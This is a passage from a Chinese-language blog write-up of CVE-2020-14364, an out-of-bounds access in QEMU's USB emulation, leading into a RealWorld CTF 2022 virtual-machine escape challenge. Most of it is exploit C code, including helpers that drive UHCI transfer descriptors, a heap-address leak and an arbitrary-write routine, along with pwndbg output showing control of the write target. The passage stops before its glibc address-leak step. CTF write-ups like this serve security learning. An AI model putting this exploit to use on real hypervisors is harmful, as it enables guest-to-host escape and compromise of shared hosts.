usb_handle_packet(q-&gt;ep-&gt;dev, &amp;async-&gt;packet);</span><br><span class="line">        if (async-&gt;packet.status == USB_RET_SUCCESS) &#123;</span><br><span class="line">            async-&gt;packet.actual_length = max_len;</span><br><span class="line">        &#125;</span><br><span class="line">.............</span><br></pre></td></tr></table></figure>
<p>即UHCI协议一次性最多传输<code>0x7ff</code>个字节。<br>思考如何利用这个漏洞，查看<code>USBDevice</code>结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">/* definition of a USB device */</span><br><span class="line">struct USBDevice &#123;</span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    char *port_path;</span><br><span class="line">    char *serial;</span><br><span class="line">    void *opaque;</span><br><span class="line">    uint32_t flags;</span><br><span class="line"></span><br><span class="line">    /* Actual connected speed */</span><br><span class="line">    int speed;</span><br><span class="line">    /* Supported speeds, not in info because it may be variable (hostdevs) */</span><br><span class="line">    int speedmask;</span><br><span class="line">    uint8_t addr;</span><br><span class="line">    char product_desc[32];</span><br><span class="line">    int auto_attach;</span><br><span class="line">    bool attached;</span><br><span class="line"></span><br><span class="line">    int32_t state;</span><br><span class="line">    uint8_t setup_buf[8];</span><br><span class="line">    uint8_t data_buf[4096];</span><br><span class="line">    int32_t remote_wakeup;</span><br><span class="line">    int32_t setup_state;</span><br><span class="line">    int32_t setup_len;</span><br><span class="line">    int32_t setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    const USBDesc *usb_desc; /* Overrides class usb_desc if not NULL */</span><br><span class="line">    const USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    int configuration;</span><br><span class="line">    int ninterfaces;</span><br><span class="line">    int altsetting[USB_MAX_INTERFACES];</span><br><span class="line">    const USBDescConfig *config;</span><br><span class="line">    const USBDescIface  *ifaces[USB_MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>位于<code>data_buf</code>后方的变量有<code>setup_len</code>和<code>setup_index</code>，那么我们越界覆盖这两个变量，便可以构造<code>任意地址写</code>，首先进行初始化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void init_state() &#123;</span><br><span class="line">    //初始化时，使用正常的长度</span><br><span class="line">    setup_buf[6] = 0xff;</span><br><span class="line">    setup_buf[7] = 0x0;</span><br><span class="line">    td-&gt;link = get_phys_addr(td);</span><br><span class="line">    td-&gt;ctrl = TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;</span><br><span class="line">    td-&gt;buffer = get_phys_addr(setup_buf);</span><br><span class="line">    puts(&quot;set_UHCIState&quot;);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>初始化的目的是当进入<code>do_token_setup</code>函数时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">    int request, value, index;</span><br><span class="line"></span><br><span class="line">    if (p-&gt;iov.size != 8) &#123;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">    s-&gt;setup_index = 0;</span><br><span class="line">    p-&gt;actual_length = 0;</span><br><span class="line">    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span><br><span class="line">    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span><br><span class="line">        fprintf(stderr,</span><br><span class="line">                &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;,</span><br><span class="line">                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">..............................</span><br><span class="line">        if (s-&gt;setup_len == 0)</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">        else</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_DATA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p-&gt;actual_length = 8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>能够执行到代码<code>s-&gt;setup_state = SETUP_STATE_DATA;</code>，为<code>s-&gt;setup_state</code>赋值，因为这个<code>s-&gt;setup_state</code>将会在<code>do_token_in</code>和<code>do_token_out</code>中作为switch的条件，<code>s-&gt;setup_state</code>必须为<code>SETUP_STATE_DATA</code>才可以进行数据的读写。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void do_token_in(USBDevice *s, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">..............................</span><br><span class="line">    switch(s-&gt;setup_state) &#123;</span><br><span class="line">    case SETUP_STATE_ACK:</span><br><span class="line">................................</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case SETUP_STATE_DATA:</span><br><span class="line">................................. //vuln</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>初始化完成以后，就可以利用漏洞将<code>s-&gt;setup_len</code>设置为任意值进行后续的越界。下面，我们写出<code>set_length</code>，<code>do_copy_read</code>和<code>do_copy_write</code>三个函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void set_length(uint16_t len, uint8_t option)&#123;</span><br><span class="line">    setup_buf[0] = USB_TOKEN_IN | option;</span><br><span class="line">    //set the length</span><br><span class="line">    setup_buf[6] = len &amp; 0xff;</span><br><span class="line">    setup_buf[7] = (len &gt;&gt; 8 ) &amp; 0xff;</span><br><span class="line">    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;</span><br><span class="line">    td-&gt;buffer = get_phys_addr(setup_buf);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//do_token_in读取数据</span><br><span class="line">void do_copy_read(uint16_t len)&#123;</span><br><span class="line">    //设置token进入do_token_in</span><br><span class="line">    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token =  USB_TOKEN_IN | (len-1) &lt;&lt; 21; //设置p-&gt;iov.size</span><br><span class="line">    td-&gt;buffer = get_phys_addr(data_buf);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//do_token_out写入数据</span><br><span class="line">void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index, uint16_t len)&#123;</span><br><span class="line">    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token =  USB_TOKEN_OUT | (len-1) &lt;&lt; 21; </span><br><span class="line">    td-&gt;buffer = get_phys_addr(data_buf);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在来完成我们的任意地址写，首先需要设置length，然后多次调用<code>do_copy_write</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static void do_token_out(USBDevice *s, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">........................</span><br><span class="line">    case SETUP_STATE_DATA:</span><br><span class="line">        if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            int len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">            if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">........................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上是<code>do_token_out</code>的代码，由于<code>s-&gt;setup_len</code>被我们设置为任意大小，因此<code>if (s-&gt;setup_index &gt;= s-&gt;setup_len)</code>条件可以被我们控制，这样<code>s-&gt;setup_state</code>就不会被设置为<code>SETUP_STATE_ACK</code>，那么我们就可以一直进行<code>do_token_out</code>写数据，每次写，<code>s-&gt;setup_index += len</code>，即<code>s-&gt;setup_index</code>经过多次写后，可以累加到超过<code>s-&gt;data_buf</code>的长度，那么当进行<code>usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len)</code>时，就发生了越界写。<br>从<code>USBDevice</code>的结构体来看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct USBDevice &#123;</span><br><span class="line">.......................</span><br><span class="line">    uint8_t setup_buf[8];</span><br><span class="line">    uint8_t data_buf[4096];</span><br><span class="line">    int32_t remote_wakeup;</span><br><span class="line">    int32_t setup_state;</span><br><span class="line">    int32_t setup_len;</span><br><span class="line">    int32_t setup_index;</span><br><span class="line">.......................</span><br></pre></td></tr></table></figure>
<p>我们可以向后越界写，覆盖<code>setup_len</code>和<code>setup_index</code>，那么我们可以实现任意地址写，设置<code>setup_index</code>为任意地址到<code>data_buf</code>地址的偏移，设置<code>setup_len</code>为要写的数据长度。<br>从上分析，为了实现任意地址写，首先需要知道<code>data_buf</code>的地址。<br>与上同理，可以通过多次<code>do_token_in</code>函数调用，让<code>setup_index</code>越界后，泄露出<code>data_buf</code>后方的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct USBDevice &#123;</span><br><span class="line">.............</span><br><span class="line">    int32_t state;</span><br><span class="line">    uint8_t setup_buf[8];</span><br><span class="line">    uint8_t data_buf[4096];</span><br><span class="line">    int32_t remote_wakeup;</span><br><span class="line">    int32_t setup_state;</span><br><span class="line">    int32_t setup_len;</span><br><span class="line">    int32_t setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">.............</span><br></pre></td></tr></table></figure>
<p>注意到<code>data_buf</code>后方有一个<code>USBEndpoint</code>结构体，改结构体定义如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct USBEndpoint &#123;</span><br><span class="line">    uint8_t nr;</span><br><span class="line">    uint8_t pid;</span><br><span class="line">    uint8_t type;</span><br><span class="line">    uint8_t ifnum;</span><br><span class="line">    int max_packet_size;</span><br><span class="line">    int max_streams;</span><br><span class="line">    bool pipeline;</span><br><span class="line">    bool halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    QTAILQ_HEAD(, USBPacket) queue;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>里面有一个<code>USBDevice *dev;</code>指向当前<code>USBDevice</code>自身，那么我们泄露出<code>USBDevice</code>的地址，再加上<code>data_buf</code>在<code>USBDevice</code>中的偏移，即可知道<code>data_buf</code>的地址。泄露的代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   init();</span><br><span class="line">   //申请IO权限</span><br><span class="line">   iopl(3);</span><br><span class="line">   init_state();</span><br><span class="line">   set_length(0x5000,USB_DIR_IN);</span><br><span class="line">   for(int i = 0; i &lt; 4; i++)</span><br><span class="line">        do_copy_read(0x400);  //set index 0x1000</span><br><span class="line">   do_copy_read(0x400);      //read 0x400 to dmabuf</span><br><span class="line"></span><br><span class="line">   struct USBDevice* usb_device_tmp = (struct USBDevice *)(data_buf + 0x4);</span><br><span class="line">   struct USBDevice usb_device;</span><br><span class="line">   memcpy(&amp;usb_device,usb_device_tmp,sizeof(USBDevice));</span><br><span class="line"></span><br><span class="line">   uint64_t dev_addr = (uint64_t)(usb_device.ep_ctl.dev);</span><br><span class="line">   data_buf_addr = dev_addr + 0xdc - 0x8;</span><br><span class="line">   //data_buf_addr = dev_addr + 0xdc;</span><br><span class="line"></span><br><span class="line">   printf(&quot;USBDevice dev_addr: 0x%lx\n&quot;, dev_addr);</span><br><span class="line">   printf(&quot;USBDevice-&gt;data_buf: 0x%lx\n&quot;, data_buf_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了<code>data_buf</code>的地址，接下来我们构造任意地址写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">//任意写</span><br><span class="line">void arb_write_seq(uint64_t target_addr, uint64_t *payload,uint64_t len)</span><br><span class="line">&#123;</span><br><span class="line">    //初始化setup_state</span><br><span class="line">    set_length(0x500, USB_DIR_OUT);</span><br><span class="line">    unsigned long offset = target_addr - data_buf_addr;</span><br><span class="line">    //设置越界长度</span><br><span class="line">    set_length(0x1010, USB_DIR_OUT);</span><br><span class="line">    puts(&quot;set index&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">    //将setup_index设置为0x1000</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    //覆盖setup_state、setup_len、setup_index</span><br><span class="line">    do_copy_write(0, offset+len, offset-0x10, 0x11);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    memcpy(data_buf,payload,len);</span><br><span class="line">    puts(&quot;wait&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">    do_copy_write(0, 0xffff, 0,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   init();</span><br><span class="line">   //申请IO权限</span><br><span class="line">   iopl(3);</span><br><span class="line">   init_state();</span><br><span class="line">   set_length(0x5000,USB_DIR_IN);</span><br><span class="line">   for(int i = 0; i &lt; 4; i++)</span><br><span class="line">        do_copy_read(0x400);  //set index 0x1000</span><br><span class="line">   do_copy_read(0x400);      //read 0x400 to dmabuf</span><br><span class="line"></span><br><span class="line">   struct USBDevice* usb_device_tmp = (struct USBDevice *)(data_buf + 0x4);</span><br><span class="line">   struct USBDevice usb_device;</span><br><span class="line">   memcpy(&amp;usb_device,usb_device_tmp,sizeof(USBDevice));</span><br><span class="line"></span><br><span class="line">   uint64_t dev_addr = (uint64_t)(usb_device.ep_ctl.dev);</span><br><span class="line">   data_buf_addr = dev_addr + 0xdc - 0x8;</span><br><span class="line">   //data_buf_addr = dev_addr + 0xdc;</span><br><span class="line"></span><br><span class="line">   printf(&quot;USBDevice dev_addr: 0x%lx\n&quot;, dev_addr);</span><br><span class="line">   printf(&quot;USBDevice-&gt;data_buf: 0x%lx\n&quot;, data_buf_addr);</span><br><span class="line">   uint64_t payload[0x100];</span><br><span class="line">   payload[0] = 0x6161616161616161;</span><br><span class="line">   arb_write_seq(0x4141414141414141,payload,0x8);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试如下,经过前4次的<code>do_copy_write(0, 0, 0, 0x400)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/core.c</span><br><span class="line">   241             if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">   242                 len = p-&gt;iov.size;</span><br><span class="line">   243             &#125;</span><br><span class="line">   244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">   245             s-&gt;setup_index += len;</span><br><span class="line"> ► 246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">   247                 s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">   248             &#125;</span><br><span class="line">   249             return;</span><br><span class="line">   250         &#125;</span><br><span class="line">   251         s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ </span><br><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$167 = 0x1000</span><br><span class="line">pwndbg&gt; p/x s-&gt;setup_len</span><br><span class="line">$168 = 0x1010</span><br></pre></td></tr></table></figure>
<p>那么接下来的<code>do_copy_write(0, offset+len, offset-0x10, 0x11);</code>如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/core.c</span><br><span class="line">   239         if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">   240             int len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">   241             if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">   242                 len = p-&gt;iov.size;</span><br><span class="line">   243             &#125;</span><br><span class="line"> ► 244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">   245             s-&gt;setup_index += len;</span><br><span class="line">   246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">   247                 s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">   248             &#125;</span><br><span class="line">   249             return;</span><br><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$169 = 0x1000</span><br><span class="line">pwndbg&gt; p/x len</span><br><span class="line">$170 = 0x10</span><br></pre></td></tr></table></figure>
<p>经过copy以后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/core.c</span><br><span class="line">   241             if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">   242                 len = p-&gt;iov.size;</span><br><span class="line">   243             &#125;</span><br><span class="line">   244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">   245             s-&gt;setup_index += len;</span><br><span class="line"> ► 246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">   247                 s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">   248             &#125;</span><br><span class="line">   249             return;</span><br><span class="line">   250         &#125;</span><br><span class="line">   251         s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$172 = 0xaf362b0d</span><br></pre></td></tr></table></figure>
<p>那么当<code>do_copy_write(0, 0xffff, 0,len)</code>时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/core.c</span><br><span class="line">   239         if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">   240             int len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">   241             if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">   242                 len = p-&gt;iov.size;</span><br><span class="line">   243             &#125;</span><br><span class="line"> ► 244             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">   245             s-&gt;setup_index += len;</span><br><span class="line">   246             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">   247                 s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">   248             &#125;</span><br><span class="line">   249             return;</span><br><span class="line">pwndbg&gt; p/x s-&gt;data_buf + s-&gt;setup_index</span><br><span class="line">$173 = 0x55c941414141</span><br></pre></td></tr></table></figure>
<p>可以发现，已经可以控制<code>s-&gt;data_buf + s-&gt;setup_index</code>为任意地址，当这有个限制是，<code>s-&gt;setup_index</code>是一个<code>int</code>型数据，因此只能在离<code>s-&gt;data_buf</code>距离int范围内进行任意写。</p>
<h2 id="0x05-黑盒虚拟机逃逸"><a href="#0x05-黑盒虚拟机逃逸" class="headerlink" title="0x05 黑盒虚拟机逃逸"></a>0x05 黑盒虚拟机逃逸</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在RealWord 2022国际赛上，我们拿到了black_box的二血，这题没有给题目附件，仅有一个远程nc环境，且提示本题是<code>CVE-2020-14364</code>。<br>首先通过lscpi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci -k</span><br><span class="line">00:01.2 Class 0c03: 8086:7020 uhci_hcd</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010 ata_piix</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>发现远程使用的是uhci的USB控制器，之前在网上的相关exp使用的是ehci控制器，通过<code>mmio</code>去进行设备的交互。而本题的难点一个就是它使用<code>UHCI</code>控制器，该设备我们前面已经介绍了。前面我们已经实现了任意地址写，那么想要劫持程序流程，还需要知道一些地址。</p>
<p>在黑盒下，我们不考虑使用程序本身的函数地址，因为我们没有附件，我们可以考虑使用glibc的地址。</p>
<p>首先是因为<code>USBDevice</code>这个结构体本身就是在堆中，通过<code>malloc</code>申请的，那么我们利用其越界读，将堆中所有的数据全部打印出来，由于程序的复杂性，堆里必定会有<code>unsorted bin</code>，那么其<code>fd</code>和<code>bk</code>泄漏后，我们就可以知道其使用的glibc版本。这是因为大多数情况下，glibc每一个版本其相关的函数、变量、符号地址会不一样，并且由于PIE的特性，函数、变量、符号的地址后12bit是不变的。泄露堆中的地址以后，我们查看其数据，经过多年的CTF经验，确定了远程glibc版本为2.32或者2.33，这两个版本的<code>unsorted bin</code>的<code>fd</code>和<code>bk</code>一样，后12bit都是<code>0xc00</code>，那么我们可以最后把这两个版本中的<code>gadgets</code>都尝试一遍。</p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>泄露地址的方法如下</p>
